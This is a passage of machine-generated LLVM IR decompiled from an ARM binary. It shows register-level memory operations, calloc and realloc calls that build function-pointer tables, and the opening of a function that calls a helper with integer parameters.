  %v1_b354 = load i32, i32* %r6.global-to-local, align 4
  %v2_b354 = inttoptr i32 %v1_b354 to i32*
  store i32 %v0_b354, i32* %v2_b354, align 4
  %v0_b358 = load i32, i32* %r2.global-to-local, align 4
  %v1_b358 = trunc i32 %v0_b358 to i8
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = inttoptr i32 %v2_b358 to i8*
  store i8 %v1_b358, i8* %v3_b358, align 1
  %v2_b35c = call i32 @_calloc(i32 %v1_b348, i32 8)
  %v2_b360 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b360 = zext i8 %v2_b360 to i32
  store i32 ptrtoint (i32* @global_var_e9ec.125 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b35c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_b370 = mul nuw nsw i32 %v3_b360, 4
  store i32 %v3_b370, i32* %r1.global-to-local, align 4
  %v2_b374 = load i32, i32* @global_var_1cd80.112, align 4
  %v2_b378 = inttoptr i32 %v2_b35c to i32*
  store i32 ptrtoint (i32* @global_var_e9ec.125 to i32), i32* %v2_b378, align 4
  %v0_b37c = load i32, i32* %r3.global-to-local, align 4
  %v1_b37c = trunc i32 %v0_b37c to i8
  %v2_b37c = load i32, i32* %r5.global-to-local, align 4
  %v3_b37c = add i32 %v2_b37c, 4
  %v4_b37c = inttoptr i32 %v3_b37c to i8*
  store i8 %v1_b37c, i8* %v4_b37c, align 1
  %v0_b380 = load i32, i32* %r1.global-to-local, align 4
  %v1_b380 = add i32 %v0_b380, 4
  store i32 %v1_b380, i32* %r1.global-to-local, align 4
  %v4_b384 = inttoptr i32 %v2_b374 to i32*
  %v5_b384 = call i32* @realloc(i32* %v4_b384, i32 %v1_b380)
  %v7_b384 = ptrtoint i32* %v5_b384 to i32
  %v2_b388 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b388 = zext i8 %v2_b388 to i32
  store i32 %v3_b388, i32* %r3.global-to-local, align 4
  store i32 %v7_b384, i32* %ip.global-to-local, align 4
  %v0_b390 = load i32, i32* %r5.global-to-local, align 4
  %v5_b390 = mul nuw nsw i32 %v3_b388, 4
  %v6_b390 = add i32 %v5_b390, %v7_b384
  %v7_b390 = inttoptr i32 %v6_b390 to i32*
  store i32 %v0_b390, i32* %v7_b390, align 4
  %v0_b394 = load i32, i32* %r3.global-to-local, align 4
  %v1_b394 = load i32, i32* %r7.global-to-local, align 4
  %v2_b394 = add i32 %v1_b394, %v0_b394
  store i32 %v2_b394, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b3a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b3a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_b3a0 = inttoptr i32 %v1_b3a0 to i32*
  store i32 %v0_b3a0, i32* %v2_b3a0, align 4
  %v0_b3a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3a4 = trunc i32 %v0_b3a4 to i8
  %v2_b3a4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3a4 = inttoptr i32 %v2_b3a4 to i8*
  store i8 %v1_b3a4, i8* %v3_b3a4, align 1
  %v2_b3a8 = call i32 @_calloc(i32 %v1_b394, i32 8)
  %v2_b3ac = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b3ac = zext i8 %v2_b3ac to i32
  store i32 ptrtoint (i32* @global_var_dbb4.127 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b3a8, i32* %r5.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v3_b3bc = mul nuw nsw i32 %v3_b3ac, 4
  store i32 %v3_b3bc, i32* %r1.global-to-local, align 4
  %v2_b3c0 = load i32, i32* @global_var_1cd80.112, align 4
  %v2_b3c4 = inttoptr i32 %v2_b3a8 to i32*
  store i32 ptrtoint (i32* @global_var_dbb4.127 to i32), i32* %v2_b3c4, align 4
  %v0_b3c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3c8 = trunc i32 %v0_b3c8 to i8
  %v2_b3c8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b3c8 = add i32 %v2_b3c8, 4
  %v4_b3c8 = inttoptr i32 %v3_b3c8 to i8*
  store i8 %v1_b3c8, i8* %v4_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = add i32 %v0_b3cc, 4
  store i32 %v1_b3cc, i32* %r1.global-to-local, align 4
  %v4_b3d0 = inttoptr i32 %v2_b3c0 to i32*
  %v5_b3d0 = call i32* @realloc(i32* %v4_b3d0, i32 %v1_b3cc)
  %v7_b3d0 = ptrtoint i32* %v5_b3d0 to i32
  %v2_b3d4 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b3d4 = zext i8 %v2_b3d4 to i32
  store i32 %v3_b3d4, i32* %r3.global-to-local, align 4
  store i32 %v7_b3d0, i32* %ip.global-to-local, align 4
  %v0_b3dc = load i32, i32* %r5.global-to-local, align 4
  %v5_b3dc = mul nuw nsw i32 %v3_b3d4, 4
  %v6_b3dc = add i32 %v5_b3dc, %v7_b3d0
  %v7_b3dc = inttoptr i32 %v6_b3dc to i32*
  store i32 %v0_b3dc, i32* %v7_b3dc, align 4
  %v0_b3e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3e0 = load i32, i32* %r7.global-to-local, align 4
  %v2_b3e0 = add i32 %v1_b3e0, %v0_b3e0
  store i32 %v2_b3e0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b3ec = load i32, i32* %ip.global-to-local, align 4
  %v1_b3ec = load i32, i32* %r6.global-to-local, align 4
  %v2_b3ec = inttoptr i32 %v1_b3ec to i32*
  store i32 %v0_b3ec, i32* %v2_b3ec, align 4
  %v0_b3f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3f0 = trunc i32 %v0_b3f0 to i8
  %v2_b3f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3f0 = inttoptr i32 %v2_b3f0 to i8*
  store i8 %v1_b3f0, i8* %v3_b3f0, align 1
  %v2_b3f4 = call i32 @_calloc(i32 %v1_b3e0, i32 8)
  %v2_b3f8 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b3f8 = zext i8 %v2_b3f8 to i32
  store i32 ptrtoint (i32* @global_var_d470.129 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b3f4, i32* %r5.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_b408 = mul nuw nsw i32 %v3_b3f8, 4
  store i32 %v3_b408, i32* %r1.global-to-local, align 4
  %v2_b40c = load i32, i32* @global_var_1cd80.112, align 4
  %v2_b410 = inttoptr i32 %v2_b3f4 to i32*
  store i32 ptrtoint (i32* @global_var_d470.129 to i32), i32* %v2_b410, align 4
  %v0_b414 = load i32, i32* %r3.global-to-local, align 4
  %v1_b414 = trunc i32 %v0_b414 to i8
  %v2_b414 = load i32, i32* %r5.global-to-local, align 4
  %v3_b414 = add i32 %v2_b414, 4
  %v4_b414 = inttoptr i32 %v3_b414 to i8*
  store i8 %v1_b414, i8* %v4_b414, align 1
  %v0_b418 = load i32, i32* %r1.global-to-local, align 4
  %v1_b418 = add i32 %v0_b418, 4
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v4_b41c = inttoptr i32 %v2_b40c to i32*
  %v5_b41c = call i32* @realloc(i32* %v4_b41c, i32 %v1_b418)
  %v7_b41c = ptrtoint i32* %v5_b41c to i32
  %v2_b420 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b420 = zext i8 %v2_b420 to i32
  store i32 %v3_b420, i32* %r3.global-to-local, align 4
  store i32 %v7_b41c, i32* %ip.global-to-local, align 4
  %v0_b428 = load i32, i32* %r5.global-to-local, align 4
  %v5_b428 = mul nuw nsw i32 %v3_b420, 4
  %v6_b428 = add i32 %v5_b428, %v7_b41c
  %v7_b428 = inttoptr i32 %v6_b428 to i32*
  store i32 %v0_b428, i32* %v7_b428, align 4
  %v0_b42c = load i32, i32* %r3.global-to-local, align 4
  %v1_b42c = load i32, i32* %r7.global-to-local, align 4
  %v2_b42c = add i32 %v1_b42c, %v0_b42c
  store i32 %v2_b42c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b438 = load i32, i32* %ip.global-to-local, align 4
  %v1_b438 = load i32, i32* %r6.global-to-local, align 4
  %v2_b438 = inttoptr i32 %v1_b438 to i32*
  store i32 %v0_b438, i32* %v2_b438, align 4
  %v0_b43c = load i32, i32* %r2.global-to-local, align 4
  %v1_b43c = trunc i32 %v0_b43c to i8
  %v2_b43c = load i32, i32* %r4.global-to-local, align 4
  %v3_b43c = inttoptr i32 %v2_b43c to i8*
  store i8 %v1_b43c, i8* %v3_b43c, align 1
  %v2_b440 = call i32 @_calloc(i32 %v1_b42c, i32 8)
  %v2_b444 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b444 = zext i8 %v2_b444 to i32
  store i32 ptrtoint (i32* @global_var_ccfc.131 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b440, i32* %r5.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_b454 = mul nuw nsw i32 %v3_b444, 4
  store i32 %v3_b454, i32* %r1.global-to-local, align 4
  %v2_b458 = load i32, i32* @global_var_1cd80.112, align 4
  %v2_b45c = inttoptr i32 %v2_b440 to i32*
  store i32 ptrtoint (i32* @global_var_ccfc.131 to i32), i32* %v2_b45c, align 4
  %v0_b460 = load i32, i32* %r3.global-to-local, align 4
  %v1_b460 = trunc i32 %v0_b460 to i8
  %v2_b460 = load i32, i32* %r5.global-to-local, align 4
  %v3_b460 = add i32 %v2_b460, 4
  %v4_b460 = inttoptr i32 %v3_b460 to i8*
  store i8 %v1_b460, i8* %v4_b460, align 1
  %v0_b464 = load i32, i32* %r1.global-to-local, align 4
  %v1_b464 = add i32 %v0_b464, 4
  store i32 %v1_b464, i32* %r1.global-to-local, align 4
  %v4_b468 = inttoptr i32 %v2_b458 to i32*
  %v5_b468 = call i32* @realloc(i32* %v4_b468, i32 %v1_b464)
  %v7_b468 = ptrtoint i32* %v5_b468 to i32
  %v2_b46c = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b46c = zext i8 %v2_b46c to i32
  store i32 %v3_b46c, i32* %r3.global-to-local, align 4
  store i32 %v7_b468, i32* %ip.global-to-local, align 4
  %v0_b474 = load i32, i32* %r5.global-to-local, align 4
  %v5_b474 = mul nuw nsw i32 %v3_b46c, 4
  %v6_b474 = add i32 %v5_b474, %v7_b468
  %v7_b474 = inttoptr i32 %v6_b474 to i32*
  store i32 %v0_b474, i32* %v7_b474, align 4
  %v0_b478 = load i32, i32* %r3.global-to-local, align 4
  %v1_b478 = load i32, i32* %r7.global-to-local, align 4
  %v2_b478 = add i32 %v1_b478, %v0_b478
  store i32 %v2_b478, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b484 = load i32, i32* %ip.global-to-local, align 4
  %v1_b484 = load i32, i32* %r6.global-to-local, align 4
  %v2_b484 = inttoptr i32 %v1_b484 to i32*
  store i32 %v0_b484, i32* %v2_b484, align 4
  %v0_b488 = load i32, i32* %r2.global-to-local, align 4
  %v1_b488 = trunc i32 %v0_b488 to i8
  %v2_b488 = load i32, i32* %r4.global-to-local, align 4
  %v3_b488 = inttoptr i32 %v2_b488 to i8*
  store i8 %v1_b488, i8* %v3_b488, align 1
  %v2_b48c = call i32 @_calloc(i32 %v1_b478, i32 8)
  %v2_b490 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b490 = zext i8 %v2_b490 to i32
  store i32 ptrtoint (i32* @global_var_c480.133 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b48c, i32* %r5.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_b4a0 = mul nuw nsw i32 %v3_b490, 4
  store i32 %v3_b4a0, i32* %r1.global-to-local, align 4
  %v2_b4a4 = load i32, i32* @global_var_1cd80.112, align 4
  %v2_b4a8 = inttoptr i32 %v2_b48c to i32*
  store i32 ptrtoint (i32* @global_var_c480.133 to i32), i32* %v2_b4a8, align 4
  %v0_b4ac = load i32, i32* %r3.global-to-local, align 4
  %v1_b4ac = trunc i32 %v0_b4ac to i8
  %v2_b4ac = load i32, i32* %r5.global-to-local, align 4
  %v3_b4ac = add i32 %v2_b4ac, 4
  %v4_b4ac = inttoptr i32 %v3_b4ac to i8*
  store i8 %v1_b4ac, i8* %v4_b4ac, align 1
  %v0_b4b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b4b0 = add i32 %v0_b4b0, 4
  store i32 %v1_b4b0, i32* %r1.global-to-local, align 4
  %v4_b4b4 = inttoptr i32 %v2_b4a4 to i32*
  %v5_b4b4 = call i32* @realloc(i32* %v4_b4b4, i32 %v1_b4b0)
  %v7_b4b4 = ptrtoint i32* %v5_b4b4 to i32
  %v2_b4b8 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b4b8 = zext i8 %v2_b4b8 to i32
  store i32 %v3_b4b8, i32* %r3.global-to-local, align 4
  store i32 %v7_b4b4, i32* %ip.global-to-local, align 4
  %v0_b4c0 = load i32, i32* %r5.global-to-local, align 4
  %v5_b4c0 = mul nuw nsw i32 %v3_b4b8, 4
  %v6_b4c0 = add i32 %v5_b4c0, %v7_b4b4
  %v7_b4c0 = inttoptr i32 %v6_b4c0 to i32*
  store i32 %v0_b4c0, i32* %v7_b4c0, align 4
  %v0_b4c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b4c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_b4c4 = add i32 %v1_b4c4, %v0_b4c4
  store i32 %v2_b4c4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b4d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b4d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_b4d0 = inttoptr i32 %v1_b4d0 to i32*
  store i32 %v0_b4d0, i32* %v2_b4d0, align 4
  %v0_b4d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b4d4 = trunc i32 %v0_b4d4 to i8
  %v2_b4d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b4d4 = inttoptr i32 %v2_b4d4 to i8*
  store i8 %v1_b4d4, i8* %v3_b4d4, align 1
  %v2_b4d8 = call i32 @_calloc(i32 %v1_b4c4, i32 8)
  %v2_b4dc = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b4dc = zext i8 %v2_b4dc to i32
  store i32 ptrtoint (i32* @global_var_bd64.135 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b4d8, i32* %r5.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_b4ec = mul nuw nsw i32 %v3_b4dc, 4
  store i32 %v3_b4ec, i32* %r1.global-to-local, align 4
  %v2_b4f0 = load i32, i32* @global_var_1cd80.112, align 4
  %v2_b4f4 = inttoptr i32 %v2_b4d8 to i32*
  store i32 ptrtoint (i32* @global_var_bd64.135 to i32), i32* %v2_b4f4, align 4
  %v0_b4f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b4f8 = trunc i32 %v0_b4f8 to i8
  %v2_b4f8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b4f8 = add i32 %v2_b4f8, 4
  %v4_b4f8 = inttoptr i32 %v3_b4f8 to i8*
  store i8 %v1_b4f8, i8* %v4_b4f8, align 1
  %v0_b4fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b4fc = add i32 %v0_b4fc, 4
  store i32 %v1_b4fc, i32* %r1.global-to-local, align 4
  %v4_b500 = inttoptr i32 %v2_b4f0 to i32*
  %v5_b500 = call i32* @realloc(i32* %v4_b500, i32 %v1_b4fc)
  %v7_b500 = ptrtoint i32* %v5_b500 to i32
  %v2_b504 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b504 = zext i8 %v2_b504 to i32
  store i32 %v3_b504, i32* %r3.global-to-local, align 4
  store i32 %v7_b500, i32* %ip.global-to-local, align 4
  %v0_b50c = load i32, i32* %r5.global-to-local, align 4
  %v5_b50c = mul nuw nsw i32 %v3_b504, 4
  %v6_b50c = add i32 %v5_b50c, %v7_b500
  %v7_b50c = inttoptr i32 %v6_b50c to i32*
  store i32 %v0_b50c, i32* %v7_b50c, align 4
  %v0_b510 = load i32, i32* %r3.global-to-local, align 4
  %v1_b510 = load i32, i32* %r7.global-to-local, align 4
  %v2_b510 = add i32 %v1_b510, %v0_b510
  store i32 %v2_b510, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b51c = load i32, i32* %ip.global-to-local, align 4
  %v1_b51c = load i32, i32* %r6.global-to-local, align 4
  %v2_b51c = inttoptr i32 %v1_b51c to i32*
  store i32 %v0_b51c, i32* %v2_b51c, align 4
  %v0_b520 = load i32, i32* %r2.global-to-local, align 4
  %v1_b520 = trunc i32 %v0_b520 to i8
  %v2_b520 = load i32, i32* %r4.global-to-local, align 4
  %v3_b520 = inttoptr i32 %v2_b520 to i8*
  store i8 %v1_b520, i8* %v3_b520, align 1
  %v2_b524 = call i32 @_calloc(i32 %v1_b510, i32 8)
  %v2_b528 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b528 = zext i8 %v2_b528 to i32
  store i32 ptrtoint (i32* @global_var_b5e8.137 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b524, i32* %r5.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_b538 = mul nuw nsw i32 %v3_b528, 4
  store i32 %v3_b538, i32* %r1.global-to-local, align 4
  %v2_b53c = load i32, i32* @global_var_1cd80.112, align 4
  %v2_b540 = inttoptr i32 %v2_b524 to i32*
  store i32 ptrtoint (i32* @global_var_b5e8.137 to i32), i32* %v2_b540, align 4
  %v0_b544 = load i32, i32* %r3.global-to-local, align 4
  %v1_b544 = trunc i32 %v0_b544 to i8
  %v2_b544 = load i32, i32* %r5.global-to-local, align 4
  %v3_b544 = add i32 %v2_b544, 4
  %v4_b544 = inttoptr i32 %v3_b544 to i8*
  store i8 %v1_b544, i8* %v4_b544, align 1
  %v0_b548 = load i32, i32* %r1.global-to-local, align 4
  %v1_b548 = add i32 %v0_b548, 4
  store i32 %v1_b548, i32* %r1.global-to-local, align 4
  %v4_b54c = inttoptr i32 %v2_b53c to i32*
  %v5_b54c = call i32* @realloc(i32* %v4_b54c, i32 %v1_b548)
  %v7_b54c = ptrtoint i32* %v5_b54c to i32
  %v2_b550 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b550 = zext i8 %v2_b550 to i32
  store i32 %v3_b550, i32* %r3.global-to-local, align 4
  store i32 %v7_b54c, i32* %ip.global-to-local, align 4
  %v0_b558 = load i32, i32* %r5.global-to-local, align 4
  %v5_b558 = mul nuw nsw i32 %v3_b550, 4
  %v6_b558 = add i32 %v5_b558, %v7_b54c
  %v7_b558 = inttoptr i32 %v6_b558 to i32*
  store i32 %v0_b558, i32* %v7_b558, align 4
  %v0_b55c = load i32, i32* %r3.global-to-local, align 4
  %v1_b55c = load i32, i32* %r7.global-to-local, align 4
  %v2_b55c = add i32 %v1_b55c, %v0_b55c
  store i32 %v2_b55c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v1_b568 = trunc i32 %v2_b55c to i8
  %v2_b568 = load i32, i32* %r4.global-to-local, align 4
  %v3_b568 = inttoptr i32 %v2_b568 to i8*
  store i8 %v1_b568, i8* %v3_b568, align 1
  %v0_b56c = load i32, i32* %ip.global-to-local, align 4
  %v1_b56c = load i32, i32* %r6.global-to-local, align 4
  %v2_b56c = inttoptr i32 %v1_b56c to i32*
  store i32 %v0_b56c, i32* %v2_b56c, align 4
  %v2_b570 = call i32 @_calloc(i32 %v1_b55c, i32 8)
  %v2_b574 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b574 = zext i8 %v2_b574 to i32
  store i32 ptrtoint (i32* @global_var_8f24.139 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b570, i32* %r5.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v3_b584 = mul nuw nsw i32 %v3_b574, 4
  store i32 %v3_b584, i32* %r1.global-to-local, align 4
  %v2_b588 = load i32, i32* @global_var_1cd80.112, align 4
  %v2_b58c = inttoptr i32 %v2_b570 to i32*
  store i32 ptrtoint (i32* @global_var_8f24.139 to i32), i32* %v2_b58c, align 4
  %v0_b590 = load i32, i32* %r3.global-to-local, align 4
  %v1_b590 = trunc i32 %v0_b590 to i8
  %v2_b590 = load i32, i32* %r5.global-to-local, align 4
  %v3_b590 = add i32 %v2_b590, 4
  %v4_b590 = inttoptr i32 %v3_b590 to i8*
  store i8 %v1_b590, i8* %v4_b590, align 1
  %v0_b594 = load i32, i32* %r1.global-to-local, align 4
  %v1_b594 = add i32 %v0_b594, 4
  store i32 %v1_b594, i32* %r1.global-to-local, align 4
  %v4_b598 = inttoptr i32 %v2_b588 to i32*
  %v5_b598 = call i32* @realloc(i32* %v4_b598, i32 %v1_b594)
  %v6_b598 = ptrtoint i32* %v5_b598 to i32
  %v2_b59c = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b59c = zext i8 %v2_b59c to i32
  store i32 %v3_b59c, i32* %r3.global-to-local, align 4
  %v1_b5a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_b5a0 = inttoptr i32 %v1_b5a0 to i32*
  store i32 %v6_b598, i32* %v2_b5a0, align 4
  %v0_b5a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b5a4 = load i32, i32* %r3.global-to-local, align 4
  %v5_b5a4 = mul i32 %v2_b5a4, 4
  %v6_b5a4 = add i32 %v5_b5a4, %v6_b598
  %v7_b5a4 = inttoptr i32 %v6_b5a4 to i32*
  store i32 %v0_b5a4, i32* %v7_b5a4, align 4
  %v0_b5a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b5a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_b5a8 = add i32 %v1_b5a8, %v0_b5a8
  store i32 %v2_b5a8, i32* %r2.global-to-local, align 4
  %v1_b5b0 = trunc i32 %v2_b5a8 to i8
  %v2_b5b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b5b0 = inttoptr i32 %v2_b5b0 to i8*
  store i8 %v1_b5b0, i8* %v3_b5b0, align 1
  %v2_b5b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_b5b4, i32* @r4, align 4
  ret i32 %v1_b5a8

; uselistorder directives
  uselistorder i32 %v1_b5a8, { 1, 0 }
  uselistorder i32 %v1_b55c, { 1, 0 }
  uselistorder i32 %v1_b510, { 1, 0 }
  uselistorder i32 %v1_b4c4, { 1, 0 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b42c, { 1, 0 }
  uselistorder i32 %v1_b3e0, { 1, 0 }
  uselistorder i32 %v1_b394, { 1, 0 }
  uselistorder i32 %v1_b348, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1cd7c.110 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_1cd7c.110, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1cd7c.110 to i32), { 1, 0 }
}

define i32 @function_b5e8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b5e8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-50 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_b5e8 = load i32, i32* @r4, align 4
  %v6_b5e8 = load i32, i32* @r5, align 4
  %v9_b5e8 = load i32, i32* @r6, align 4
  %v12_b5e8 = load i32, i32* @r7, align 4
  %v15_b5e8 = load i32, i32* @r8, align 4
  %v21_b5e8 = load i32, i32* @sl, align 4
  %v1_b5ec = urem i32 %arg1, 256
  store i32 %v1_b5ec, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_b5ec, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b604 = urem i32 %arg3, 256
  store i32 %v1_b604, i32* @r4, align 4
  %v2_b608 = call i32 @_calloc(i32 %v1_b5ec, i32 4)
  %v0_b60c = load i32, i32* @r5, align 4
  store i32 %v0_b60c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b61c = load i32, i32* @r4, align 4
  store i32 %v0_b61c, i32* %r0.global-to-local, align 4
  %v5_b620 = inttoptr i32 %v0_b60c to i32*
  %v6_b620 = call i32 @function_b240(i32 %v0_b61c, i32* %v5_b620, i32 2, i32 0)
  %v1_b62c = urem i32 %v6_b620, 256
  store i32 %v1_b62c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b638 = load i32, i32* @r5, align 4
  store i32 %v0_b638, i32* %r1.global-to-local, align 4
  %v0_b63c = load i32, i32* @r4, align 4
  store i32 %v0_b63c, i32* %r0.global-to-local, align 4
  %v5_b640 = trunc i32 %v6_b620 to i8
  %v6_b644 = inttoptr i32 %v0_b638 to i32*
  %v7_b644 = call i32 @function_b240(i32 %v0_b63c, i32* %v6_b644, i32 3, i32 65535)
  %v0_b648 = load i32, i32* @r5, align 4
  store i32 %v0_b648, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b644, i32* @r7, align 4
  %v0_b658 = load i32, i32* @r4, align 4
  store i32 %v0_b658, i32* %r0.global-to-local, align 4
  %v4_b65c = inttoptr i32 %v0_b648 to i32*
  %v5_b65c = call i32 @function_b240(i32 %v0_b658, i32* %v4_b65c, i32 4, i32 64)
  %v1_b664 = urem i32 %v5_b65c, 256
  store i32 %v1_b664, i32* %ip.global-to-local, align 4
  %v0_b668 = load i32, i32* @r5, align 4
  store i32 %v0_b668, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b674 = load i32, i32* @r4, align 4
  store i32 %v0_b674, i32* %r0.global-to-local, align 4
  %v5_b678 = trunc i32 %v5_b65c to i8
  %v6_b67c = inttoptr i32 %v0_b668 to i32*
  %v7_b67c = call i32 @function_b240(i32 %v0_b674, i32* %v6_b67c, i32 5, i32 1)
  %v1_b688 = urem i32 %v7_b67c, 256
  store i32 %v1_b688, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b694 = load i32, i32* @r5, align 4
  store i32 %v0_b694, i32* %r1.global-to-local, align 4
  %v0_b698 = load i32, i32* @r4, align 4
  store i32 %v0_b698, i32* %r0.global-to-local, align 4
  %v5_b6a0 = inttoptr i32 %v0_b694 to i32*
  %v6_b6a0 = call i32 @function_b240(i32 %v0_b698, i32* %v5_b6a0, i32 6, i32 65535)
  %v0_b6a8 = load i32, i32* @r5, align 4
  store i32 %v0_b6a8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b6a0, i32* @sl, align 4
  %v0_b6b8 = load i32, i32* @r4, align 4
  store i32 %v0_b6b8, i32* %r0.global-to-local, align 4
  %v4_b6bc = inttoptr i32 %v0_b6a8 to i32*
  %v5_b6bc = call i32 @function_b240(i32 %v0_b6b8, i32* %v4_b6bc, i32 7, i32 65535)
  %v0_b6c0 = load i32, i32* @r5, align 4
  store i32 %v0_b6c0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_b6bc, i32* @r8, align 4
  %v0_b6d0 = load i32, i32* @r4, align 4
  store i32 %v0_b6d0, i32* %r0.global-to-local, align 4
  %v4_b6d4 = inttoptr i32 %v0_b6c0 to i32*
  %v5_b6d4 = call i32 @function_b240(i32 %v0_b6d0, i32* %v4_b6d4, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
